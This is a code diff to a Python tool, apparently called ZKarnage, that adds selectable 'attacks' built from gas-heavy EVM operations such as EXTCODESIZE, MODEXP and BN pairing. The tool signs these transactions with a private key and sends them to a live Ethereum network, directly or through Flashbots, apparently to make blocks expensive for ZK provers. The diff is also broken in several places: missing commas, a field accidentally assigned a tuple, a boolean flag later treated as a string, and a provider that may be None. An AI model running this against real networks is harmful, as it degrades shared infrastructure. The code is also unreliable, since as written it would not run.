@@ -17,6 +17,8 @@ import traceback
 import datetime
 from typing import List, Optional, Dict, Any
 from pathlib import Path
+from enum import Enum
+from abi_provider import ZKaranageGasTargetABIProvider, ABIProvider
 
 from dotenv import load_dotenv
 from web3 import Web3, HTTPProvider
@@ -60,6 +62,80 @@ def setup_logging():
 
 # Initialize logger
 logger = setup_logging()
+
+class Attack(Enum):
+    EXTCODESIZE = 1
+    JUMPDEST = 2
+    MCOPY = 3
+    CALLDATACOPY = 4
+    MODEXP = 5
+    BNPAIRING = 6
+    BNMUL = 7
+    ECRECOVER = 8
+    KECCAK = 9
+    SHA256 = 10
+
+
+    def get_tx_data(self, abi_provider) -> str:
+        match self:
+            case Attack.EXTCODESIZE:
+                # Load contract targets from CSV file
+                try:
+                    import csv
+                    import os
+                    
+                    # Get the directory of the current script
+                    script_dir = os.path.dirname(os.path.abspath(__file__))
+                    csv_path = os.path.join(script_dir, "big-contracts.csv")
+                    
+                    # Default to 100 contracts if not specified
+                    max_contracts = int(os.getenv('MAX_CONTRACTS', '100'))
+                    
+                    contract_targets = []
+                    with open(csv_path, 'r') as f:
+                        reader = csv.DictReader(f)
+                        for row in reader:
+                            if len(contract_targets) >= max_contracts:
+                                break
+                            contract_targets.append(Web3.to_checksum_address(row['address']))
+                    
+                    logger.info(f"Loaded {len(contract_targets)} contracts from {csv_path}")
+                    
+                except Exception as e:
+                    logger.error(f"Error loading contracts from CSV: {e}")
+                    logger.error("Falling back to hardcoded contract list")
+                    # Fallback to hardcoded list if CSV loading fails
+                    contract_targets = [
+                        Web3.to_checksum_address("0x1908D2bD020Ba25012eb41CF2e0eAd7abA1c48BC"),
+                        # ... rest of the hardcoded addresses ...
+                    ]
+
+                # Debug print addresses
+                logger.info(f"Contract targets: {contract_targets}")
+                logger.info(f"Number of targets: {len(contract_targets)}")
+                return abi_provider.get_extcodesize_attack_data(contract_targets)
+
+            case Attack.JUMPDEST:
+                return abi_provider.get_jumpdest_attack_data()
+            case Attack.MCOPY:
+                return abi_provider.get_mcopy_attack_data()
+            case Attack.CALLDATACOPY:
+                return abi_provider.get_calldatacopy_attack_data(32 * 1024) # 32 Kb
+            case Attack.MODEXP:
+                return abi_provider.get_modexp_attack_data()
+            case Attack.BNPAIRING:
+                return abi_provider.get_bnpairing_attack_data()
+            case Attack.BNMUL:
+                return abi_provider.get_bnmult_attack_data()
+            case Attack.ECRECOVER:
+                return abi_provider.get_ecrecover_attack_data()
+            case Attack.KECCAK:
+                return abi_provider.get_keccak_attack_data(512)
+            case Attack.SHA256:
+                return abi_provider.get_sha256_attack_data(512)
+
+
+
 
 class ZKarnageError(Exception):
     """Base exception for ZKarnage errors."""
@@ -565,12 +641,16 @@ class ZKarnage:
         self, 
         w3: Web3, 
         account: Account, 
-        relay_url: str, 
+        relay_url: str,
+        abi_provider: ABIProvider,
+        attack: Optional[Attack] = Attack.EXTCODESIZE
         contract_address: Optional[Address] = None
     ):
         self.w3 = w3
         self.account = account
         self.contract_address = contract_address
+        self.attack = attack,
+        self.abi_provider = abi_provider
         self.flashbots = FlashbotsManager(w3, relay_url, account)
     
     def get_next_hundred_block(self, current_block: Optional[int] = None) -> int:
@@ -934,60 +1014,7 @@ class ZKarnage:
         latest = self.w3.eth.get_block("latest")
         base_fee = latest.get("baseFeePerGas", self.w3.eth.gas_price)
         
-        # ABI for executing attack (simplified)
-        attack_abi = {
-            "inputs": [{"name": "targets", "type": "address[]"}],
-            "name": "executeAttack",
-            "type": "function"
-        }
-        
-        # Load contract targets from CSV file
-        try:
-            import csv
-            import os
-            
-            # Get the directory of the current script
-            script_dir = os.path.dirname(os.path.abspath(__file__))
-            csv_path = os.path.join(script_dir, "big-contracts.csv")
-            
-            # Default to 100 contracts if not specified
-            max_contracts = int(os.getenv('MAX_CONTRACTS', '100'))
-            
-            contract_targets = []
-            with open(csv_path, 'r') as f:
-                reader = csv.DictReader(f)
-                for row in reader:
-                    if len(contract_targets) >= max_contracts:
-                        break
-                    contract_targets.append(Web3.to_checksum_address(row['address']))
-            
-            logger.info(f"Loaded {len(contract_targets)} contracts from {csv_path}")
-            
-        except Exception as e:
-            logger.error(f"Error loading contracts from CSV: {e}")
-            logger.error("Falling back to hardcoded contract list")
-            # Fallback to hardcoded list if CSV loading fails
-            contract_targets = [
-                Web3.to_checksum_address("0x1908D2bD020Ba25012eb41CF2e0eAd7abA1c48BC"),
-                # ... rest of the hardcoded addresses ...
-            ]
-        
-        # Debug print addresses
-        logger.info(f"Contract targets: {contract_targets}")
-        logger.info(f"Number of targets: {len(contract_targets)}")
-        
-        # Encode the function call data using eth-abi
-        encoded_data = encode(['address[]'], [contract_targets])
-        
-        # Debug print encoded data
-        logger.info(f"Encoded data (hex): {encoded_data.hex()}")
-        
-        # Get function signature - ensure we get exactly 4 bytes
-        function_selector = Web3.keccak(text="executeAttack(address[])").hex()[0:10]  # 0x + 8 chars (4 bytes)
-        logger.info(f"Function selector: {function_selector}")
-        
-        # Full transaction data
-        data = function_selector + encoded_data.hex()
+        data = self.attack.get_tx_data(self.abi_provider)
         logger.info(f"Complete transaction data: {data[:64]}...")
         
         # Set standard fees
@@ -1033,11 +1060,20 @@ async def main():
     # Check for flags
     fast_mode = "--fast" in sys.argv
     flashbots_mode = "--flashbots" in sys.argv
+    attack = "--attack" in sys.argv
+    gas_target = "--gas-target" in sys.argv
+
+    if not attack:
+        attack = "extcodesize"
     
     if fast_mode:
         logger.info("Fast mode enabled: will target block 2 blocks ahead")
     if flashbots_mode:
         logger.info("Flashbots mode enabled: will submit bundle instead of direct transaction")
+    if attack:
+        logger.info(f"Will use attack: {attack}")
+    if gas_target:
+        logger.info(f"Will use ZKarnageGasTarget")
     else:
         logger.info("Direct transaction mode: will submit transaction directly to network")
     
@@ -1065,12 +1101,18 @@ async def main():
     
     # Create account
     account = Account.from_key(PRIVATE_KEY)
+
+    abi_provider = None
+    if gas_target:
+        abi_provider = ZKaranageGasTargetABIProvider(0)
     
     # Initialize ZKarnage
     zkarnage = ZKarnage(
         w3=w3, 
         account=account, 
         relay_url=FLASHBOTS_RELAY_URL,
+        abi_provider=abi_provider
+        attack=Attack[attack.upper()]
         contract_address=Web3.to_checksum_address(CONTRACT_ADDRESS)
     )
     
